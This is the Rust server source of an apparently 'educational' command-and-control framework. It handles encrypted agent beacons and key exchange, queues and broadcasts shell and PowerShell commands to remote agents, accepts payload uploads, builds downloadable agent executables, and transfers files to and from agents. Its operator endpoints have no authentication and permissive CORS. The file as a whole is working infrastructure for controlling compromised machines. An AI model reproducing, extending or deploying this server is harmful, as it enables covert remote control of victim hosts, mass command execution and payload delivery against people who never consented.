use axum::{
    routing::{get, post},
    Router,
    extract::{Path, State, Multipart},
    Json,
    http::{HeaderMap, StatusCode},
};
use tower_http::{
    cors::CorsLayer,
    services::ServeDir,
};
use std::collections::{HashMap, HashSet};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::broadcast;
use serde_json::Value;
use chrono::Utc;
use serde::{Deserialize, Serialize};

mod db;
mod logger;
mod sessions;
mod auth;
mod crypto;
mod websocket;
mod tls_util;
mod build_service;
mod file_service;

use crate::db::PayloadUpload;
use db::{Database, AgentMetrics, CommandResult, validate_beacon_interval, DEFAULT_BEACON_INTERVAL_SECS};
use sessions::SessionManager;
use websocket::{ServerState, dashboard_ws_handler, PendingCommand};
use logger::{log_info, log_warn};

#[derive(Deserialize, Serialize)]
pub struct EncryptedEnvelope {
    payload: String,
}

#[derive(Deserialize)]
struct BeaconData {
    id: String,
    status: String,
    #[serde(default)]
    bootstrap: bool,
    hostname: Option<String>,
    os: Option<String>,
    cpu_usage: Option<f64>,
    memory_usage: Option<f64>,
    disk_usage: Option<f64>,
}

#[derive(Serialize)]
struct BeaconResponse {
    success: bool,
    timestamp: String,
    commands: Vec<PendingCommand>,
    sleep_interval_secs: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    session_key: Option<String>,
}

#[derive(Deserialize)]
struct CommandResultData {
    agent_id: String,
    command_id: String,
    output: String,
    status: String,
}

#[derive(Deserialize)]
struct BroadcastRequest {
    command: String,
    command_type: Option<String>,
    filters: BroadcastFilters,
}

#[derive(Deserialize)]
struct BroadcastFilters {
    #[serde(default)]
    os: Vec<String>,
    #[serde(default = "default_status_filter")]
    status: Vec<String>,
}

fn default_status_filter() -> Vec<String> {
    vec!["online".to_string()]
}

fn agent_matches_filters(agent: &db::Agent, filters: &BroadcastFilters) -> bool {
    if !filters.os.is_empty() {
        let os_lower = agent.os.to_lowercase();
        let matches_os = filters.os.iter().any(|f| {
            let f = f.to_lowercase();
            os_lower.contains(&f) || (f == "binary" && !os_lower.contains("windows") && !os_lower.contains("linux"))
        });
        if !matches_os {
            return false;
        }
    }

    if filters.status.iter().any(|s| s.to_lowercase() == "all") {
        return true;
    }

    let status_lower = agent.status.to_lowercase();
    filters.status.iter().any(|s| s.to_lowercase() == status_lower)
}

#[derive(Deserialize)]
struct QueueCommandRequest {
    agent_id: String,
    command_type: String,
    payload: String,
}

#[derive(Deserialize)]
struct BuildAgentRequest {
    target_os: String,
    server_url: String,
    psk: String,
    beacon_interval: u64,
}

fn extract_bearer_token(headers: &HeaderMap) -> Option<String> {
    headers
        .get("Authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .map(|s| s.to_string())
}

fn dashboard_dir() -> &'static str {
    if std::path::Path::new("./dashboard-react/dist").exists() {
        "./dashboard-react/dist"
    } else if std::path::Path::new("../dashboard-react/dist").exists() {
        "../dashboard-react/dist"
    } else if std::path::Path::new("./dashboard").exists() {
        "./dashboard"
    } else {
        "../dashboard"
    }
}

#[tokio::main]
async fn main() {
    let db_path = "c2_simulator.db";
    let db = Database::new(db_path);

    let now_str = Utc::now().to_rfc3339();
    let _ = db.end_all_active_sessions(&now_str);

    let session_manager = SessionManager::new(db.clone());
    let offline_sessions = session_manager.clone();

    let (tx, _) = broadcast::channel::<Value>(1024);

    let state = ServerState {
        db: db.clone(),
        session_manager,
        tx: tx.clone(),
        command_queue: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
        session_keys: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
        beacon_paused: Arc::new(tokio::sync::RwLock::new(HashSet::new())),
    };

    log_info(&db, &tx, "Server", None, "Starting Educational Multi-Agent C2 Server (HTTPS Beacon Mode)...");

    let dash = dashboard_dir();
    log_info(&db, &tx, "Server", None, &format!("Serving dashboard from: {}", dash));

    let offline_db = db.clone();
    let offline_tx = tx.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            if let Ok(agents) = offline_db.get_agents() {
                let now = Utc::now();
                for agent in agents {
                    if agent.status != "Online" {
                        continue;
                    }
                    if let Ok(last) = chrono::DateTime::parse_from_rfc3339(&agent.last_seen) {
                        let elapsed = now.signed_duration_since(last).num_seconds();
                        let timeout = (agent.beacon_interval_secs * 3).max(90) as i64;
                        if elapsed > timeout {
                            let ts = now.to_rfc3339();
                            let _ = offline_db.update_agent_status(&agent.id, "Offline", &ts);
                            let _ = offline_sessions.end_session(&agent.id);
                            log_info(
                                &offline_db,
                                &offline_tx,
                                "Server",
                                Some(agent.id.clone()),
                                "Agent marked offline (beacon timeout)",
                            );
                            let _ = offline_tx.send(serde_json::json!({
                                "type": "AgentStatus",
                                "payload": {
                                    "id": agent.id,
                                    "status": "Offline",
                                    "last_seen": ts
                                }
                            }));
                        }
                    }
                }
            }
        }
    });

    let app = Router::new()
        .route("/api/agents", get(get_agents))
        .route("/api/agents/build", post(build_agent))
        .route("/api/agents/builds", get(list_agent_builds))
        .route("/api/agents/download/:id", get(download_agent_build))
        .route("/api/agents/:id/metrics", get(get_agent_metrics))
        .route("/api/agents/:id/logs", get(get_agent_logs))
        .route("/api/agents/:id/results", get(get_command_results))
        .route("/api/agents/:id/session/kill", post(kill_agent_session))
        .route("/api/agents/:id/session/start", post(start_operator_session))
        .route("/api/logs", get(get_logs))
        .route("/api/beacon", post(receive_beacon))
        .route("/api/result", post(receive_result))
        .route("/api/command/queue", post(queue_command))
        .route("/api/command/broadcast", post(broadcast_command))
        .route("/api/command/broadcast/history", get(get_broadcast_history))
        .route("/api/payloads/upload", post(upload_payload))
        .route("/api/payloads/sessions", get(get_payload_sessions))
        .route("/api/files/upload/:agent_id", post(file_service::initiate_upload_to_agent))
        .route("/api/files/download/:agent_id", post(file_service::initiate_download_from_agent))
        .route("/api/files/chunk", post(file_service::receive_agent_chunk))
        .route("/api/files/agent/:agent_id", get(file_service::list_agent_transfers))
        .route("/api/files/:transfer_id/chunks/:chunk_index", get(file_service::get_transfer_chunk))
        .route("/api/files/:transfer_id", get(file_service::get_transfer_status))
        .route("/api/dashboard/ws", get(dashboard_ws_handler))
        .fallback_service(ServeDir::new(dash))
        .layer(CorsLayer::permissive())
        .with_state(state);

    let cert_dir = std::env::var("C2_CERT_DIR").unwrap_or_else(|_| "certs".to_string());
    let (cert_path, key_path) = tls_util::ensure_certs(&cert_dir).expect("Failed to create TLS certificates");
    let tls_config = axum_server::tls_rustls::RustlsConfig::from_pem_file(cert_path, key_path)
        .await
        .expect("Failed to load TLS config");

    let addr = SocketAddr::from(([0, 0, 0, 0], 3443));
    log_info(&db, &tx, "Server", None, &format!("Server listening on https://{}", addr));
    log_info(&db, &tx, "Server", None, &format!("Beacon endpoint: POST https://{}/api/beacon (AES-GCM encrypted)", addr));

    axum_server::bind_rustls(addr, tls_config)
        .serve(app.into_make_service())
        .await
        .unwrap();
}

async fn receive_beacon(
    State(state): State<ServerState>,
    headers: HeaderMap,
    Json(envelope): Json<EncryptedEnvelope>,
) -> Result<Json<EncryptedEnvelope>, StatusCode> {
    let psk = auth::get_psk();
    let psk_key = crypto::derive_key_from_psk(&psk);

    let (data, used_psk) = decrypt_beacon(&state, &headers, &envelope.payload, &psk_key).await?;

    let token = extract_bearer_token(&headers).ok_or(StatusCode::UNAUTHORIZED)?;
    if !auth::verify_agent_token(&data.id, &token) {
        log_warn(&state.db, &state.tx, "Beacon", Some(data.id.clone()), "Invalid auth token");
        return Err(StatusCode::UNAUTHORIZED);
    }

    let now = Utc::now().to_rfc3339();
    let hostname = data.hostname.unwrap_or_else(|| "unknown".to_string());
    let os = data.os.unwrap_or_else(|| "unknown".to_string());

    let beacon_interval = state
        .db
        .get_beacon_interval(&data.id)
        .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS);

    let old_status = state
        .db
        .get_agents()
        .ok()
        .and_then(|agents| agents.into_iter().find(|a| a.id == data.id))
        .map(|a| a.status);

    let agent = db::Agent {
        id: data.id.clone(),
        hostname: hostname.clone(),
        os: os.clone(),
        status: "Online".to_string(),
        last_seen: now.clone(),
        beacon_interval_secs: beacon_interval,
    };
    let _ = state.db.upsert_agent(&agent);
    let _ = state.session_manager.start_session(&data.id);

    log_info(
        &state.db,
        &state.tx,
        "Beacon",
        Some(data.id.clone()),
        &format!("Beacon [{}] from {} ({}, {})", data.status, data.id, hostname, os),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "AgentStatus",
        "payload": {
            "id": data.id,
            "hostname": hostname,
            "os": os,
            "status": "Online",
            "last_seen": now
        }
    }));

    if old_status.as_deref() != Some("Online") {
        let _ = state.tx.send(serde_json::json!({
            "type": "AgentStatusChanged",
            "payload": {
                "agent_id": data.id,
                "old_status": old_status.unwrap_or_else(|| "Unknown".to_string()),
                "new_status": "Online",
            }
        }));
    }

    if let (Some(cpu), Some(mem), Some(disk)) = (data.cpu_usage, data.memory_usage, data.disk_usage) {
        let metrics = AgentMetrics {
            id: None,
            agent_id: agent.id.clone(),
            cpu_usage: cpu,
            memory_usage: mem,
            disk_usage: disk,
            timestamp: now.clone(),
        };
        let _ = state.db.insert_metrics(&metrics);
        let _ = state.tx.send(serde_json::json!({
            "type": "Metrics",
            "payload": metrics
        }));
    }

    let commands = {
        let mut queue = state.command_queue.write().await;
        let pending = queue.remove(&agent.id).unwrap_or_default();
        let mut outbound = Vec::new();

        for cmd in pending {
            if cmd.command_type == "set_interval" {
                match cmd.payload.trim().parse::<u64>() {
                    Ok(requested) => match validate_beacon_interval(requested) {
                        Ok(valid) => {
                            let _ = state.db.update_beacon_interval(&agent.id, valid);
                            log_info(
                                &state.db,
                                &state.tx,
                                "Interval",
                                Some(agent.id.clone()),
                                &format!("Beacon interval updated to {} seconds", valid),
                            );
                        }
                        Err(e) => log_warn(
                            &state.db,
                            &state.tx,
                            "Interval",
                            Some(agent.id.clone()),
                            &format!("Rejected interval update: {}", e),
                        ),
                    },
                    Err(_) => log_warn(
                        &state.db,
                        &state.tx,
                        "Interval",
                        Some(agent.id.clone()),
                        "Rejected interval update: payload must be an integer",
                    ),
                }
            } else {
                outbound.push(cmd);
            }
        }

        outbound
    };

    let sleep_interval_secs = {
        let paused = state.beacon_paused.read().await;
        if paused.contains(&agent.id) {
            2
        } else {
            state
                .db
                .get_beacon_interval(&agent.id)
                .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS)
        }
    };

    if !commands.is_empty() {
        log_info(
            &state.db,
            &state.tx,
            "Command",
            Some(agent.id.clone()),
            &format!("Sending {} commands to agent", commands.len()),
        );
    }

    let mut session_key_out: Option<String> = None;
    if used_psk {
        let new_key = crypto::generate_session_key_hex();
        {
            let mut keys = state.session_keys.write().await;
            keys.insert(agent.id.clone(), new_key.clone());
        }
        session_key_out = Some(new_key);
        log_info(
            &state.db,
            &state.tx,
            "KeyExchange",
            Some(agent.id.clone()),
            "Session key established on first beacon",
        );
    }

    let response = BeaconResponse {
        success: true,
        timestamp: now,
        commands,
        sleep_interval_secs,
        session_key: session_key_out,
    };

    let response_key = if used_psk {
        psk_key
    } else {
        let keys = state.session_keys.read().await;
        let hex_key = keys.get(&agent.id).ok_or(StatusCode::UNAUTHORIZED)?;
        crypto::key_from_hex(hex_key).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
    };

    let response_bytes = serde_json::to_vec(&response).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let encrypted = crypto::encrypt(&response_bytes, &response_key).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(EncryptedEnvelope { payload: encrypted }))
}

async fn decrypt_beacon(
    state: &ServerState,
    headers: &HeaderMap,
    payload: &str,
    psk_key: &[u8; 32],
) -> Result<(BeaconData, bool), StatusCode> {
    if let Ok(plaintext) = crypto::decrypt(payload, psk_key) {
        if let Ok(data) = serde_json::from_slice::<BeaconData>(&plaintext) {
            if data.bootstrap {
                return Ok((data, true));
            }
        }
    }

    let agent_id = headers
        .get("X-Agent-Id")
        .and_then(|v| v.to_str().ok())
        .ok_or(StatusCode::UNAUTHORIZED)?;

    let keys = state.session_keys.read().await;
    let hex_key = keys.get(agent_id).ok_or(StatusCode::UNAUTHORIZED)?;
    let session_key = crypto::key_from_hex(hex_key).map_err(|_| StatusCode::UNAUTHORIZED)?;

    let plaintext = crypto::decrypt(payload, &session_key).map_err(|e| {
        log_warn(&state.db, &state.tx, "Beacon", None, &format!("Decrypt failed: {}", e));
        StatusCode::BAD_REQUEST
    })?;
    let data: BeaconData = serde_json::from_slice(&plaintext).map_err(|_| StatusCode::BAD_REQUEST)?;

    Ok((data, false))
}

async fn receive_result(
    State(state): State<ServerState>,
    headers: HeaderMap,
    Json(envelope): Json<EncryptedEnvelope>,
) -> Result<Json<EncryptedEnvelope>, StatusCode> {
    let agent_id = headers
        .get("X-Agent-Id")
        .and_then(|v| v.to_str().ok())
        .ok_or(StatusCode::BAD_REQUEST)?
        .to_string();

    let keys = state.session_keys.read().await;
    let hex_key = keys.get(&agent_id).ok_or(StatusCode::UNAUTHORIZED)?;
    let session_key = crypto::key_from_hex(hex_key).map_err(|_| StatusCode::UNAUTHORIZED)?;

    let plaintext = crypto::decrypt(&envelope.payload, &session_key).map_err(|_| StatusCode::BAD_REQUEST)?;
    let data: CommandResultData = serde_json::from_slice(&plaintext).map_err(|_| StatusCode::BAD_REQUEST)?;

    let token = extract_bearer_token(&headers).ok_or(StatusCode::UNAUTHORIZED)?;
    if !auth::verify_agent_token(&data.agent_id, &token) {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let now = Utc::now().to_rfc3339();

    let result = CommandResult {
        id: None,
        command_id: data.command_id.clone(),
        agent_id: data.agent_id.clone(),
        output: data.output.clone(),
        status: data.status.clone(),
        timestamp: now.clone(),
    };
    let _ = state.db.store_command_result(&result);

    let preview = if data.output.len() > 50 {
        &data.output[..50]
    } else {
        &data.output
    };
    log_info(
        &state.db,
        &state.tx,
        "Result",
        Some(data.agent_id.clone()),
        &format!("Command {} {}: {}", data.command_id, data.status, preview),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "CommandResult",
        "payload": {
            "agent_id": data.agent_id,
            "command_id": data.command_id,
            "status": data.status,
            "output": data.output,
            "timestamp": now
        }
    }));

    let ack = serde_json::json!({ "success": true });
    let ack_bytes = serde_json::to_vec(&ack).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let encrypted = crypto::encrypt(&ack_bytes, &session_key).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(EncryptedEnvelope { payload: encrypted }))
}

async fn queue_command(
    State(state): State<ServerState>,
    Json(data): Json<QueueCommandRequest>,
) -> Json<Value> {
    let cmd_id = uuid::Uuid::new_v4().to_string();

    let command = PendingCommand {
        id: cmd_id.clone(),
        command_type: data.command_type.clone(),
        payload: data.payload.clone(),
    };

    let is_shell_cmd = matches!(
        data.command_type.as_str(),
        "shell" | "bash" | "cmd" | "powershell"
    );

    {
        let mut queue = state.command_queue.write().await;
        if is_shell_cmd {
            let paused = state.beacon_paused.read().await;
            if !paused.contains(&data.agent_id) {
                drop(paused);
                state
                    .beacon_paused
                    .write()
                    .await
                    .insert(data.agent_id.clone());
                queue
                    .entry(data.agent_id.clone())
                    .or_default()
                    .insert(
                        0,
                        PendingCommand {
                            id: uuid::Uuid::new_v4().to_string(),
                            command_type: "beacon_pause".to_string(),
                            payload: String::new(),
                        },
                    );
            }
        }
        queue
            .entry(data.agent_id.clone())
            .or_default()
            .push(command);
    }

    log_info(
        &state.db,
        &state.tx,
        "CommandQueued",
        Some(data.agent_id.clone()),
        &format!("Command {} ({}) queued for agent", cmd_id, data.command_type),
    );

    Json(serde_json::json!({
        "success": true,
        "command_id": cmd_id
    }))
}

async fn get_agents(State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_agents() {
        Ok(agents) => Json(serde_json::to_value(agents).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

async fn get_agent_metrics(Path(id): Path<String>, State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_agent_metrics(&id, 100) {
        Ok(metrics) => Json(serde_json::to_value(metrics).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

async fn get_agent_logs(Path(id): Path<String>, State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_agent_logs(&id, 100) {
        Ok(logs) => Json(serde_json::to_value(logs).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

async fn get_command_results(Path(id): Path<String>, State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_command_results(&id, 50) {
        Ok(results) => Json(serde_json::to_value(results).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

async fn get_logs(State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_logs(100) {
        Ok(logs) => Json(serde_json::to_value(logs).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

fn payloads_dir() -> &'static str {
    "./payloads"
}

async fn upload_payload(
    State(state): State<ServerState>,
    mut multipart: Multipart,
) -> Result<Json<Value>, StatusCode> {
    let dir = payloads_dir();
    tokio::fs::create_dir_all(dir)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let mut file_name = String::new();
    let mut file_bytes: Vec<u8> = Vec::new();

    while let Some(field) = multipart
        .next_field()
        .await
        .map_err(|_| StatusCode::BAD_REQUEST)?
    {
        if field.name() == Some("file") {
            file_name = field
                .file_name()
                .map(|s| s.to_string())
                .unwrap_or_else(|| "payload.bin".to_string());
            file_bytes = field
                .bytes()
                .await
                .map_err(|_| StatusCode::BAD_REQUEST)?
                .to_vec();
        }
    }

    if file_bytes.is_empty() {
        return Err(StatusCode::BAD_REQUEST);
    }

    let upload_id = uuid::Uuid::new_v4().to_string();
    let safe_name = file_name
        .chars()
        .map(|c| if c.is_alphanumeric() || c == '.' || c == '-' || c == '_' { c } else { '_' })
        .collect::<String>();
    let storage_name = format!("{}_{}", upload_id, safe_name);
    let storage_path = format!("{}/{}", dir, storage_name);

    tokio::fs::write(&storage_path, &file_bytes)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let now = Utc::now().to_rfc3339();
    let upload = PayloadUpload {
        id: upload_id.clone(),
        file_name: file_name.clone(),
        file_size: file_bytes.len() as i64,
        status: "Active".to_string(),
        uploaded_at: now.clone(),
    };

    state
        .db
        .insert_payload_upload(&upload, &storage_path)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    log_info(
        &state.db,
        &state.tx,
        "PayloadUpload",
        None,
        &format!("Stored payload {} ({} bytes)", file_name, file_bytes.len()),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "PayloadUpload",
        "payload": {
            "id": upload_id,
            "file_name": file_name,
            "file_size": file_bytes.len(),
            "status": "Active",
            "uploaded_at": now
        }
    }));

    Ok(Json(serde_json::json!({
        "success": true,
        "session": {
            "id": upload_id,
            "fileName": file_name,
            "fileSize": file_bytes.len(),
            "status": "Active",
            "uploadedAt": now
        }
    })))
}

async fn get_payload_sessions(State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_payload_uploads(100) {
        Ok(uploads) => {
            let sessions: Vec<Value> = uploads
                .into_iter()
                .map(|u| {
                    serde_json::json!({
                        "id": u.id,
                        "fileName": u.file_name,
                        "fileSize": u.file_size,
                        "status": u.status,
                        "uploadedAt": u.uploaded_at,
                    })
                })
                .collect();
            Json(serde_json::json!(sessions))
        }
        Err(_) => Json(Value::Null),
    }
}

async fn build_agent(
    State(state): State<ServerState>,
    Json(req): Json<BuildAgentRequest>,
) -> Result<Json<Value>, StatusCode> {
    let build_req = build_service::BuildRequest {
        target_os: req.target_os,
        server_url: req.server_url,
        psk: req.psk,
        beacon_interval: req.beacon_interval,
    };

    match build_service::start_build(&state, build_req).await {
        Ok(resp) => Ok(Json(serde_json::to_value(resp).unwrap_or(Value::Null))),
        Err(e) => {
            log_warn(&state.db, &state.tx, "Build", None, &format!("Build rejected: {}", e));
            Err(StatusCode::BAD_REQUEST)
        }
    }
}

async fn list_agent_builds(State(state): State<ServerState>) -> Json<Value> {
    match build_service::list_builds(&state.db) {
        Ok(builds) => Json(serde_json::json!(builds)),
        Err(_) => Json(Value::Null),
    }
}

async fn download_agent_build(
    State(state): State<ServerState>,
    Path(id): Path<String>,
) -> Result<axum::response::Response, StatusCode> {
    let build = state
        .db
        .get_agent_build(&id)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        .ok_or(StatusCode::NOT_FOUND)?;

    if build.status != "completed" {
        return Err(StatusCode::CONFLICT);
    }

    let data = tokio::fs::read(&build.file_path)
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;

    let ext = match build.target_os.to_lowercase().as_str() {
        "windows" => ".exe",
        "binary" => ".bin",
        _ => "",
    };
    let filename = format!("agent_{}{}", &build.id[..8], ext);

    Ok(axum::response::Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/octet-stream")
        .header(
            "Content-Disposition",
            format!("attachment; filename=\"{}\"", filename),
        )
        .body(axum::body::Body::from(data))
        .unwrap())
}

async fn broadcast_command(
    State(state): State<ServerState>,
    Json(data): Json<BroadcastRequest>,
) -> Json<Value> {
    let agents = state.db.get_agents().unwrap_or_default();
    let matching: Vec<_> = agents
        .iter()
        .filter(|a| agent_matches_filters(a, &data.filters))
        .collect();

    let cmd_type = data.command_type.clone().unwrap_or_else(|| "shell".to_string());
    let broadcast_id = uuid::Uuid::new_v4().to_string();
    let now = Utc::now().to_rfc3339();
    let mut queued = 0usize;

    {
        let mut queue = state.command_queue.write().await;
        for agent in &matching {
            let cmd_id = uuid::Uuid::new_v4().to_string();
            let command = PendingCommand {
                id: cmd_id,
                command_type: cmd_type.clone(),
                payload: data.command.clone(),
            };
            queue.entry(agent.id.clone()).or_default().push(command);
            queued += 1;
        }
    }

    let filters_json = serde_json::to_string(&serde_json::json!({
        "os": data.filters.os,
        "status": data.filters.status,
    }))
    .unwrap_or_default();

    let record = db::BroadcastHistory {
        id: broadcast_id.clone(),
        command: data.command.clone(),
        filters: filters_json,
        agent_count: queued as i64,
        created_at: now,
    };
    let _ = state.db.insert_broadcast(&record);

    log_info(
        &state.db,
        &state.tx,
        "Broadcast",
        None,
        &format!("Broadcast {} queued for {} agents", broadcast_id, queued),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "BroadcastSent",
        "payload": {
            "broadcast_id": broadcast_id,
            "agent_count": queued,
            "command": data.command,
        }
    }));

    Json(serde_json::json!({
        "success": true,
        "broadcast_id": broadcast_id,
        "agent_count": queued,
    }))
}

async fn get_broadcast_history(State(state): State<ServerState>) -> Json<Value> {
    match state.db.get_broadcast_history(50) {
        Ok(records) => Json(serde_json::to_value(records).unwrap_or(Value::Null)),
        Err(_) => Json(Value::Null),
    }
}

async fn start_operator_session(
    Path(id): Path<String>,
    State(state): State<ServerState>,
) -> Json<Value> {
    {
        let mut paused = state.beacon_paused.write().await;
        if paused.contains(&id) {
            return Json(serde_json::json!({ "success": true, "already_active": true }));
        }
        paused.insert(id.clone());
    }

    let cmd_id = uuid::Uuid::new_v4().to_string();
    let command = PendingCommand {
        id: cmd_id.clone(),
        command_type: "beacon_pause".to_string(),
        payload: String::new(),
    };
    {
        let mut queue = state.command_queue.write().await;
        queue.entry(id.clone()).or_default().push(command);
    }

    log_info(
        &state.db,
        &state.tx,
        "Session",
        Some(id.clone()),
        "Operator session started — beacon paused for rapid command delivery",
    );

    Json(serde_json::json!({ "success": true, "command_id": cmd_id }))
}

async fn kill_agent_session(
    Path(id): Path<String>,
    State(state): State<ServerState>,
) -> Json<Value> {
    state.beacon_paused.write().await.remove(&id);

    let cmd_id = uuid::Uuid::new_v4().to_string();
    let kill_cmd = PendingCommand {
        id: cmd_id.clone(),
        command_type: "session_kill".to_string(),
        payload: String::new(),
    };
    let resume_cmd = PendingCommand {
        id: uuid::Uuid::new_v4().to_string(),
        command_type: "beacon_resume".to_string(),
        payload: String::new(),
    };
    {
        let mut queue = state.command_queue.write().await;
        queue.entry(id.clone()).or_default().push(kill_cmd);
        queue.entry(id.clone()).or_default().push(resume_cmd);
    }
    let _ = state.session_manager.end_session(&id);
    log_info(
        &state.db,
        &state.tx,
        "Session",
        Some(id.clone()),
        "Session killed by operator",
    );
    let _ = state.tx.send(serde_json::json!({
        "type": "SessionKilled",
        "payload": { "agent_id": id }
    }));
    Json(serde_json::json!({ "success": true, "command_id": cmd_id }))
}
